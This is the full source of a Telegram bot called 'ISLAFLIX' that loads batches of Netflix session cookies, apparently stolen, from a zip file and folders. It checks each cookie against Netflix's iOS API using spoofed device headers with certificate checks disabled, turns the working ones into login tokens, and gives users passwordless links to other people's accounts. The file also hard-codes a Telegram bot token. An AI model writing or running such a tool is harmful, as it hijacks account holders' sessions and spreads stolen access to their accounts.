import os
import json
import re
import urllib.parse
from datetime import datetime, timedelta
import logging
import random
import sqlite3
import asyncio
import zipfile
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.utils.keyboard import InlineKeyboardBuilder
import requests
from urllib3.exceptions import InsecureRequestWarning

# تحديد المسار الحقيقي والثابت للمجلد الذي يوجد فيه السكربت تلقائياً
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
print(f"[DEBUG] Base Directory: {BASE_DIR}")

# فك ضغط مجلد الكوكيز تلقائياً وتتبع العملية
COOKIES_ZIP = os.path.join(BASE_DIR, "cookies.zip")
COOKIES_DIR = os.path.join(BASE_DIR, "cookies")

if os.path.exists(COOKIES_ZIP):
    print(f"[DEBUG] Found cookies.zip at: {COOKIES_ZIP}")
    if not os.path.exists(COOKIES_DIR):
        os.makedirs(COOKIES_DIR, exist_ok=True)
    try:
        with zipfile.ZipFile(COOKIES_ZIP, 'r') as zip_ref:
            zip_ref.extractall(BASE_DIR)
        print("[DEBUG] Cookies zip extracted successfully!")
    except Exception as e:
        print(f"[ERROR] Failed to extract cookies.zip: {e}")
else:
    print(f"[WARNING] cookies.zip not found at {COOKIES_ZIP}")

# التأكد من إنشاء المجلدات إذا لم تكن موجودة
os.makedirs(COOKIES_DIR, exist_ok=True)
VIP_COOKIES_DIR = os.path.join(BASE_DIR, "vipcookies")
os.makedirs(VIP_COOKIES_DIR, exist_ok=True)

# التوكن الخاص ببوتك على تيليجرام
BOT_TOKEN = "8282364189:AAHPugzFqjsQDMzznap8jgYDyoq4nIELOms"

# تم تفريغ آيدي المطور والـ VIP للاختبار
ADMIN_ID = 0  
VIP_IDS = []

USERS_FILE = os.path.join(BASE_DIR, "users.txt")
DB_FILE = os.path.join(BASE_DIR, "bot_limits.db")
API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"

# إعداد قاعدة البيانات
def init_db():
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS user_claims (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            claim_time TEXT
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS user_lang (
            user_id INTEGER PRIMARY KEY,
            lang TEXT
        )
    """)
    conn.commit()
    conn.close()

init_db()

def get_user_lang(user_id):
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute("SELECT lang FROM user_lang WHERE user_id = ?", (user_id,))
    row = cursor.fetchone()
    conn.close()
    return row[0] if row else None

def set_user_lang(user_id, lang):
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute("INSERT OR REPLACE INTO user_lang (user_id, lang) VALUES (?, ?)", (user_id, lang))
    conn.commit()
    conn.close()

def check_user_limit(user_id):
    if user_id == ADMIN_ID or user_id in VIP_IDS:
        return True, 0  
        
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    thirty_mins_ago = (datetime.now() - timedelta(minutes=30)).isoformat()
    cursor.execute("DELETE FROM user_claims WHERE claim_time < ?", (thirty_mins_ago,))
    conn.commit()
    
    cursor.execute("SELECT claim_time FROM user_claims WHERE user_id = ? ORDER BY claim_time ASC", (user_id,))
    claims = cursor.fetchall()
    conn.close()
    
    if len(claims) >= 10:
        oldest_str = claims[0][0]
        oldest_claim_time = datetime.fromisoformat(oldest_str)
        reset_time = oldest_claim_time + timedelta(minutes=30)
        remaining_time = reset_time - datetime.now()
        minutes = int(remaining_time.total_seconds() // 60)
        seconds = int(remaining_time.total_seconds() % 60)
        return False, f"{minutes} دقيقة و {seconds} ثانية" if minutes > 0 else f"{seconds} ثانية"
        
    return True, 10 - len(claims)

def add_user_claim(user_id):
    if user_id == ADMIN_ID or user_id in VIP_IDS:
        return 
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute("INSERT INTO user_claims (user_id, claim_time) VALUES (?, ?)", (user_id, datetime.now().isoformat()))
    conn.commit()
    conn.close()

QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}

BASE_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}

COOKIE_KEYS = ("NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent")
REQUIRED_COOKIE = "NetflixId"

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
logging.basicConfig(level=logging.INFO)

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

def add_user(user_id):
    user_id_str = str(user_id)
    users = set()
    if os.path.exists(USERS_FILE):
        with open(USERS_FILE, "r", encoding="utf-8") as f:
            users = set(line.strip() for line in f if line.strip())
    if user_id_str not in users:
        with open(USERS_FILE, "a", encoding="utf-8") as f:
            f.write(user_id_str + "\n")

def get_total_users():
    if not os.path.exists(USERS_FILE):
        return 0
    with open(USERS_FILE, "r", encoding="utf-8") as f:
        return sum(1 for line in f if line.strip())

def get_stock_count(target_dir):
    if not os.path.exists(target_dir):
        return 0
    # فحص شامل حتى لو كانت الملفات داخل مجلد فرعي بالخطأ
    files = []
    for root, dirs, filenames in os.walk(target_dir):
        for f in filenames:
            if f.endswith(".txt"):
                files.append(f)
    print(f"[DEBUG] Stock count for {target_dir}: {len(files)} files found.")
    return len(files)

def parse_netscape_cookie_line(line):
    parts = line.strip().split("\t")
    if len(parts) >= 7:
        return {parts[5]: parts[6]}
    return {}

def _decode_cookie_value(value):
    if isinstance(value, str) and "%" in value:
        try:
            return urllib.parse.unquote(value)
        except Exception:
            return value
    return value

def extract_cookie_dict(text):
    cookie_dict = {}
    for raw_line in text.splitlines():
        line = raw_line.strip()
        if not line or line.startswith("#"):
            continue
        cookie_dict.update(parse_netscape_cookie_line(line))

    try:
        data = json.loads(text)
    except json.JSONDecodeError:
        data = None

    if isinstance(data, list):
        for cookie in data:
            name = cookie.get("name")
            value = cookie.get("value")
            if name in COOKIE_KEYS and isinstance(value, str):
                cookie_dict[name] = _decode_cookie_value(value)
    elif isinstance(data, dict):
        if any(key in data for key in COOKIE_KEYS):
            for key in COOKIE_KEYS:
                value = data.get(key)
                if isinstance(value, str):
                    cookie_dict[key] = _decode_cookie_value(value)
        elif isinstance(data.get("cookies"), list):
            for cookie in data["cookies"]:
                name = cookie.get("name")
                value = cookie.get("value")
                if name in COOKIE_KEYS and isinstance(value, str):
                    cookie_dict[name] = _decode_cookie_value(value)

    for key in COOKIE_KEYS:
        if key in cookie_dict:
            continue
        match = re.search(rf"(?<!\w){re.escape(key)}=([^;,\s]+)", text)
        if match:
            cookie_dict[key] = _decode_cookie_value(match.group(1))

    return cookie_dict

def fetch_nftoken(cookie_dict):
    netflix_id = cookie_dict.get(REQUIRED_COOKIE)
    if not netflix_id:
        return None, None

    headers = dict(BASE_HEADERS)
    headers["Cookie"] = f"NetflixId={netflix_id}"

    try:
        response = requests.get(
            API_URL,
            params=QUERY_PARAMS,
            headers=headers,
            timeout=7,
            verify=False,
        )
        if response.status_code == 200:
            data = response.json()
            token_data = (
                (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default")
                or {}
            )
            token = token_data.get("token")
            expires = token_data.get("expires")
            if token:
                if isinstance(expires, int) and len(str(expires)) == 13:
                    expires //= 1000
                return token, expires
    except Exception:
        pass
    return None, None

def get_working_cookie_and_token_sync(is_vip):
    target_dir = VIP_COOKIES_DIR if is_vip else COOKIES_DIR
    if not os.path.exists(target_dir):
        return None, None

    all_files = []
    for root, dirs, files in os.walk(target_dir):
        for f in files:
            if f.endswith(".txt"):
                all_files.append(os.path.join(root, f))

    if not all_files:
        print(f"[WARNING] No text files found in {target_dir}")
        return None, None

    random.shuffle(all_files)

    for file_path in all_files:
        try:
            with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                raw_text = f.read()
            
            cookie_dict = extract_cookie_dict(raw_text)
            if not cookie_dict:
                os.remove(file_path)
                continue

            token, _ = fetch_nftoken(cookie_dict)
            if token:
                return file_path, token
            else:
                os.remove(file_path)
        except Exception:
            try:
                os.remove(file_path)
            except Exception:
                pass
    return None, None

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    add_user(message.from_user.id)
    
    builder = InlineKeyboardBuilder()
    builder.button(text="🇸🇦 العربية", callback_data="lang_ar")
    builder.button(text="🇬🇧 English", callback_data="lang_en")
    builder.adjust(2)

    text = (
        "🌐 **Please choose your preferred language:**\n"
        "🌐 **الرجاء اختيار لغتك المفضلة:**"
    )
    await message.answer(text, reply_markup=builder.as_markup(), parse_mode="Markdown")

@dp.callback_query(F.data.startswith("lang_"))
async def process_language(callback: types.CallbackQuery):
    try:
        await callback.answer()
    except Exception:
        pass
        
    lang = callback.data.split("_")[1]
    set_user_lang(callback.from_user.id, lang)
    await show_rules_and_intro(callback.message, lang)

async def show_rules_and_intro(message: types.Message, lang: str):
    builder = InlineKeyboardBuilder()
    
    if lang == "ar":
        text = (
            " ══════════════════ \n"
            " 🌟**ISLAFLIX BOT** 🌟\n"
            " ══════════════════ \n\n"
            "👨‍💻 **المطور وصانع البوت:** المطور **إسلام**.\n"
            "📌 **عن البوت:** منصة ذكية ومقدمة مجاناً بالكامل لتوليد وتشغيل حسابات نتفليكس الرسمية بكل سهولة.\n\n"
            "⚠️ **شروط وأحكام الاستخدام الهامة:**\n"
            " ┣ 🎁 **البوت مجاني 100% للجميع** ولا يحتاج لأي رسوم.\n"
            " ┣ 🚫 **يُمنع منعاً باتاً بيع الحسابات** أو المتاجرة بها، وكل من يخالف ذلك سيتم حظره نهائياً.\n"
            " ┗ 🛡️ **نظام الحماية:** مسموح بسحب **10 حسابات كحد أقصى** كل **30 دقيقة** لضمان استمرارية الخدمة.\n\n"
            "✨ *بالضغط على زر (موافق والمتابعة)، فإنك توافق على الشروط وتتعهد بعدم بيع الحسابات.*"
        )
        builder.button(text="✅ موافق والمتابعة", callback_data="check_user_type")
    else:
        text = (
            " ══════════════════ \n"
            "  🌟 **ISLAFLIX BOT** 🌟\n"
            " ══════════════════ \n\n"
            "👨‍💻 **Developer & Creator:** Developed by **Islam**.\n"
            "📌 **About Bot:** An intelligent platform provided completely free to generate and run official Netflix accounts easily.\n\n"
            "⚠️ **Important Terms & Conditions:**\n"
            " ┣ 🎁 **The bot is 100% FREE for everyone** with no fees.\n"
            " ┣ 🚫 **Selling accounts is strictly prohibited**, violators will be permanently banned.\n"
            " ┗ 🛡️ **Anti-Spam Policy:** Limited to **10 accounts max** every **30 minutes** to ensure fair use.\n\n"
            "✨ *By clicking (Agree & Continue), you accept the rules and pledge not to sell the accounts.*"
        )
        builder.button(text="✅ Agree & Continue", callback_data="check_user_type")
        
    builder.adjust(1)
    await message.edit_text(text, reply_markup=builder.as_markup(), parse_mode="Markdown")

@dp.callback_query(F.data == "check_user_type")
async def choose_user_type(callback: types.CallbackQuery):
    try:
        await callback.answer()
    except Exception:
        pass
        
    lang = get_user_lang(callback.from_user.id) or "ar"
    
    builder = InlineKeyboardBuilder()
    if lang == "ar":
        builder.button(text="👤 شخص عادي (مستخدم عام)", callback_data="mode_normal")
        builder.button(text="💎 عضو VIP (حسابات بريميوم حصرية)", callback_data="mode_vip")
        text = (
            "🔍 **اختر نوع حسابك للمتابعة:**\n"
            "━━━━━━━━━━━━━━━━━━━\n"
            "👤 **شخص عادي:** للسحب من الكوكيز العامة (بحد أقصى 10 حسابات كل 30 دقيقة).\n"
            "💎 **عضو VIP:** للسحب المباشر من حسابات البريميوم الحصرية (يتطلب آيدي مسجل)."
        )
    else:
        builder.button(text="👤 Normal User", callback_data="mode_normal")
        builder.button(text="💎 VIP Member (Exclusive Premium)", callback_data="mode_vip")
        text = (
            "🔍 **Select your account type to proceed:**\n"
            "━━━━━━━━━━━━━━━━━━━\n"
            "👤 **Normal User:** General cookies access (Max 10 accounts every 30 minutes).\n"
            "💎 **VIP Member:** Direct access to exclusive premium accounts (requires registered ID)."
        )
        
    builder.adjust(1)
    await callback.message.edit_text(text, reply_markup=builder.as_markup(), parse_mode="Markdown")

@dp.callback_query(F.data == "mode_normal")
async def enter_normal_mode(callback: types.CallbackQuery):
    try:
        await callback.answer()
    except Exception:
        pass
    await show_main_menu(callback, is_vip=False)

@dp.callback_query(F.data == "mode_vip")
async def enter_vip_mode(callback: types.CallbackQuery):
    try:
        await callback.answer()
    except Exception:
        pass
        
    user_id = callback.from_user.id
    lang = get_user_lang(user_id) or "ar"
    
    if user_id == ADMIN_ID or user_id in VIP_IDS:
        await show_main_menu(callback, is_vip=True)
    else:
        if lang == "ar":
            error_text = (
                "❌ **عذراً، آيديك غير مسجل في قائمة الـ VIP!**\n"
                "━━━━━━━━━━━━━━━━━━━\n"
                "⚠️ هذا القسم مخصص للأعضاء المميزين فقط."
            )
        else:
            error_text = (
                "❌ **Sorry, your ID is not registered in the VIP list!**\n"
                "━━━━━━━━━━━━━━━━━━━\n"
                "⚠️ This section is for VIP members only."
            )
        await callback.message.edit_text(error_text, parse_mode="Markdown")

async def show_main_menu(callback: types.CallbackQuery, is_vip: bool):
    user_id = callback.from_user.id
    lang = get_user_lang(user_id) or "ar"
    
    target_stock_dir = VIP_COOKIES_DIR if is_vip else COOKIES_DIR
    stock = get_stock_count(target_stock_dir)
    status_icon = "🟢" if stock > 0 else "🔴"
    
    builder = InlineKeyboardBuilder()
    mode_suffix = "_vip" if is_vip else "_normal"
    
    if lang == "ar":
        builder.button(text="📱  توليد حساب (هاتف محمول)", callback_data=f"dev_phone{mode_suffix}")
        builder.button(text="💻  توليد حساب (كمبيوتر - PC)", callback_data=f"dev_pc{mode_suffix}")
        builder.button(text="📺  توليد حساب (تلفاز ذكي - Smart TV)", callback_data=f"dev_tv{mode_suffix}")
        
        if user_id == ADMIN_ID and is_vip:
            builder.button(text="📊 لوحة التحكم والإحصائيات", callback_data="admin_stats")
            builder.button(text="🧹 فحص وتنظيف الحسابات التالفة", callback_data="clean_cookies")
            
        builder.adjust(1)
        
        welcome_text = (
            "╔══════════════════════════╗\n"
            "    🔥**ISLAFLIX OFFICIAL** 🔥\n"
            "╚══════════════════════════╝\n\n"
            f"{'👑 *مرحباً بك في قسم الـ VIP البريميوم الحصري!*' if is_vip else '👑 *مرحباً بك في القسم العادي لبوت نتفليكس.*'}\n\n"
            f"{'🌟 **نوع السحب:** سحب مباشر من مخزون البريميوم (`vipcookies`).' if is_vip else '🛡️ **نظام الحماية:** الحد الأقصى للسحب هو **10 حسابات** كل **30 دقيقة**.'}\n\n"
            f"📊 **حالة المخزون المتاح لك:**\n"
            f" ┣ 📦 الحسابات المتاحة: **`{stock}`** حساب جاهز\n"
            f" ┗ ⚡ حالة السيرفر: {status_icon} **`{'متصل وجاهز للعمل بكفاءة' if stock > 0 else 'المخزون نفذ مؤقتاً'}`**\n\n"
            "💎 *اختر الجهاز المراد تشغيل الحساب عليه من الأزرار الفخمة بالأسفل:*"
        )
    else:
        builder.button(text="📱  Generate Account (Mobile)", callback_data=f"dev_phone{mode_suffix}")
        builder.button(text="💻  Generate Account (PC / Laptop)", callback_data=f"dev_pc{mode_suffix}")
        builder.button(text="📺  Generate Account (Smart TV)", callback_data=f"dev_tv{mode_suffix}")
        
        if user_id == ADMIN_ID and is_vip:
            builder.button(text="📊 Admin Dashboard & Stats", callback_data="admin_stats")
            builder.button(text="🧹 Clean Broken Cookies", callback_data="clean_cookies")
            
        builder.adjust(1)
        
        welcome_text = (
            "╔══════════════════════════╗\n"
            "        🔥 **ISLAFLIX OFFICIAL** 🔥\n"
            "╚══════════════════════════╝\n\n"
            f"{'👑 *Welcome to the exclusive VIP Premium section!*' if is_vip else '👑 *Welcome to the normal Netflix bot section.*'}\n\n"
            f"{'🌟 **Stock Type:** Direct pull from premium stock (`vipcookies`).' if is_vip else '🛡️ **Protection System:** Maximum limit is **10 accounts** every **30 minutes**.'}\n\n"
            f"📊 **Available Stock for You:**\n"
            f" ┣ 📦 Available Accounts: **`{stock}`** ready accounts\n"
            f" ┗ ⚡ Server Status: {status_icon} **`{'Online & Fully Operational' if stock > 0 else 'Out of Stock'}`**\n\n"
            "💎 *Select your device type from the premium buttons below:*"
        )
        
    await callback.message.edit_text(welcome_text, reply_markup=builder.as_markup(), parse_mode="Markdown")

@dp.callback_query(F.data == "admin_stats")
async def admin_statistics(callback: types.CallbackQuery):
    try:
        await callback.answer()
    except Exception:
        pass
        
    if callback.from_user.id != ADMIN_ID:
        return

    total_users = get_total_users()
    normal_stock = get_stock_count(COOKIES_DIR)
    vip_stock = get_stock_count(VIP_COOKIES_DIR)

    stats_text = (
        "👑 **لوحة تحكم المطور - ISLAFLIX**\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        f"👥 إجمالي المستخدمين المسجلين: **`{total_users}`** مستخدم\n"
        f"📦 حسابات الأعضاء العاديين (`cookies`): **`{normal_stock}`** حساب\n"
        f"💎 حسابات البريميوم VIP (`vipcookies`): **`{vip_stock}`** حساب\n"
        f"🌟 إجمالي أعضاء الـ VIP المضافين: **`{len(VIP_IDS)}`** عضو\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        "💡 *البوت يعزل حسابات الـ VIP تماماً عن المستخدمين العاديين.*"
    )
    
    builder = InlineKeyboardBuilder()
    await callback.message.edit_text(stats_text, reply_markup=builder.as_markup(), parse_mode="Markdown")

@dp.callback_query(F.data == "clean_cookies")
async def manual_clean_cookies(callback: types.CallbackQuery):
    try:
        await callback.answer()
    except Exception:
        pass
        
    if callback.from_user.id != ADMIN_ID:
        return

    await callback.message.edit_text(
        "🧹 **جاري فحص وتنظيف جميع الحسابات (العادية والـ VIP)...**\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        "🔄 *يرجى الانتظار، يتم اختبار صلاحية كل الملفات الآن.*",
        parse_mode="Markdown"
    )

    def background_clean():
        removed_count = 0
        for target_dir in [COOKIES_DIR, VIP_COOKIES_DIR]:
            if os.path.exists(target_dir):
                for root, dirs, files in os.walk(target_dir):
                    for filename in files:
                        if not filename.endswith(".txt"):
                            continue
                        file_path = os.path.join(root, filename)
                        try:
                            with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                                raw_text = f.read()
                            cookie_dict = extract_cookie_dict(raw_text)
                            if not cookie_dict:
                                os.remove(file_path)
                                removed_count += 1
                                continue
                            
                            token, _ = fetch_nftoken(cookie_dict)
                            if not token:
                                os.remove(file_path)
                                removed_count += 1
                        except Exception:
                            try:
                                os.remove(file_path)
                                removed_count += 1
                            except Exception:
                                pass
        return removed_count

    removed_count = await asyncio.to_thread(background_clean)
    normal_final = get_stock_count(COOKIES_DIR)
    vip_final = get_stock_count(VIP_COOKIES_DIR)
    
    clean_result_text = (
        "✅ **تم الانتهاء من عملية الفحص والتشغيل بنجاح!**\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        f"🗑️ الملفات التالفة المحذوفة: **`{removed_count}`** ملف\n"
        f"📦 المخزون العادي المتبقي: **`{normal_final}`** حساب\n"
        f"💎 مخزون البريميوم VIP المتبقي: **`{vip_final}`** حساب"
    )

    builder = InlineKeyboardBuilder()
    await callback.message.edit_text(clean_result_text, reply_markup=builder.as_markup(), parse_mode="Markdown")

@dp.callback_query(F.data.startswith("dev_"))
async def process_device_selection(callback: types.CallbackQuery):
    try:
        await callback.answer()
    except Exception:
        pass

    user_id = callback.from_user.id
    lang = get_user_lang(user_id) or "ar"

    parts = callback.data.split("_")
    device = parts[1]
    mode_type = parts[2]
    is_vip = (mode_type == "vip")

    if not is_vip:
        allowed, info = check_user_limit(user_id)
        if not allowed:
            if lang == "ar":
                limit_msg = (
                    "🛑 **لقد تجاوزت الحد المسموح به!**\n"
                    "━━━━━━━━━━━━━━━━━━━\n"
                    "⚠️ يمكنك استخراج **10 حسابات كحد أقصى كل 30 دقيقة**.\n"
                    f"⏳ يرجى الانتظار لمدة: **`{info}`** لكي تتمكن من توليد حسابات جديدة."
                )
            else:
                limit_msg = (
                    "🛑 **You have exceeded your limit!**\n"
                    "━━━━━━━━━━━━━━━━━━━\n"
                    "⚠️ You can extract **a maximum of 10 accounts every 30 minutes**.\n"
                    f"⏳ Please wait for: **`{info}`** to generate new accounts."
                )
            await callback.message.edit_text(
                limit_msg,
                parse_mode="Markdown"
            )
            return

    wait_text = "⏳ **جاري فحص الحسابات وسحب جلسة نظيفة...**\n🔄 *يرجى الانتظار لحظات...*" if lang == "ar" else "⏳ **Checking stock and extracting a clean session...**\n🔄 *Please wait a moment...*"
    await callback.message.edit_text(wait_text, parse_mode="Markdown")

    _, token = await asyncio.to_thread(get_working_cookie_and_token_sync, is_vip)

    if not token:
        target_dir = VIP_COOKIES_DIR if is_vip else COOKIES_DIR
        stock = get_stock_count(target_dir)
        
        if lang == "ar":
            no_stock_msg = (
                "❌ **عذراً، نفذت الحسابات الخاصة بهذا القسم حالياً!**\n\n"
                f"📦 المخزون المتبقي: **`{stock}`** حساب\n"
                "⚠️ *يرجى المحاولة لاحقاً.*"
            )
        else:
            no_stock_msg = (
                "❌ **Sorry, accounts for this section are currently out of stock!**\n\n"
                f"📦 Remaining Stock: **`{stock}`** accounts\n"
                "⚠️ *Please try later.*"
            )
        await callback.message.edit_text(
            no_stock_msg,
            parse_mode="Markdown"
        )
        return

    if not is_vip:
        add_user_claim(user_id)

    if device == "phone":
        url = f"https://netflix.com/unsupported?nftoken={token}"
        instructions = (
            "📱 **تعليمات التشغيل (هاتف محمول):**\n"
            "━━━━━━━━━━━━━━━━━━━\n"
            "⚠️ **تنبيه هام:** يجب استخدام متصفح **Google Chrome**!\n\n"
            "1️⃣ اضغط على الزر بالأسفل لفتح الرابط أو نسخه.\n"
            "2️⃣ افتح تطبيق **Google Chrome** والصق الرابط.\n"
            "3️⃣ اضغط **Open App** للدخول لتطبيق نتفليكس فوراً!"
        ) if lang == "ar" else (
            "📱 **Instructions (Mobile):**\n"
            "━━━━━━━━━━━━━━━━━━━\n"
            "⚠️ **Important:** Use **Google Chrome** browser!\n\n"
            "1️⃣ Click the button below to open or copy the link.\n"
            "2️⃣ Open **Google Chrome** and paste the link.\n"
            "3️⃣ Click **Open App** to enter Netflix!"
        )
    elif device == "pc":
        url = f"https://www.netflix.com/login?nftoken={token}"
        instructions = (
            "💻 **تعليمات التشغيل (كمبيوتر):**\n"
            "━━━━━━━━━━━━━━━━━━━\n"
            "⚠️ **تنبيه هام:** يفضل استخدام متصفح **Google Chrome**.\n\n"
            "1️⃣ افتح الرابط أدناه عبر المتصفح.\n"
            "2️⃣ سيسجل الحساب دخولك تلقائياً وبدون كلمة مرور!"
        ) if lang == "ar" else (
            "💻 **Instructions (PC / Laptop):**\n"
            "━━━━━━━━━━━━━━━━━━━\n"
            "⚠️ **Important:** Use **Google Chrome**.\n\n"
            "1️⃣ Open the link below in your browser.\n"
            "2️⃣ You will be logged in automatically without a password!"
        )
    elif device == "tv":
        url = f"https://netflix.com/tv2?nftoken={token}"
        instructions = (
            "📺 **تعليمات التشغيل (تلفاز ذكي - Smart TV):**\n"
            "━━━━━━━━━━━━━━━━━━━\n"
            "1️⃣ افتح نتفليكس على التلفاز وخذ كود التنشيط.\n"
            "2️⃣ افتح الرابط أدناه في متصفح هاتفك أو حاسوبك لإتمام الربط."
        ) if lang == "ar" else (
            "📺 **Instructions (Smart TV):**\n"
            "━━━━━━━━━━━━━━━━━━━\n"
            "1️⃣ Open Netflix on TV and get the code.\n"
            "2️⃣ Open the link below on your phone or PC browser to link it."
        )

    if is_vip:
        remaining_text = " (حساب VIP بريميوم - سحب بلا حدود 🌟)" if lang == "ar" else " (VIP Premium Account - Unlimited Access 🌟)"
    else:
        _, remaining_or_time = check_user_limit(user_id)
        remaining_text = f" رصيدك المتبقي خلال الـ 30 دقيقة القادمة: `{remaining_or_time}` حسابات." if lang == "ar" else f" Your remaining balance in the next 30m: `{remaining_or_time}` accounts."

    link_title = "🌐 فتح الرابط في المتصفح" if lang == "ar" else "🌐 Open Link in Browser"
    btn_another = "🔄 توليد حساب آخر" if lang == "ar" else "🔄 Generate Another"

    response_msg = (
        f"{instructions}\n\n"
        f"🔗 **رابط الدخول المباشر (Direct Access Link):**\n"
        f"`{url}`\n\n"
        f"🛡️{remaining_text}\n"
        "🔒 *الرابط آمن ومخصص لك وحدك.*"
    )
    
    builder = InlineKeyboardBuilder()
    builder.button(text=link_title, url=url)
    builder.button(text=btn_another, callback_data=f"dev_{device}_{mode_type}")
    builder.adjust(1)

    await callback.message.edit_text(response_msg, reply_markup=builder.as_markup(), parse_mode="Markdown")

if __name__ == "__main__":
    print("ISLAFLIX Ultimate Professional Bot is running successfully...")
    asyncio.run(dp.start_polling(bot))
